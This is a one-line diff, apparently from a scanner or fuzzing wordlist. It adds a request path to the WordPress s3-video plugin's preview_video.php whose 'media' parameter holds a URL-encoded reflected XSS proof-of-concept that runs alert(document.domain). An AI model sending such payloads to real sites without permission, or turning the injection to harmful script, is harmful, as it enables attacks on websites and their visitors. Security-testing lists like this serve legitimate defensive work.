@@ -1,0 +1,1 @@
+/wp-content/plugins/s3-video/views/video-management/preview_video.php?media=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%22
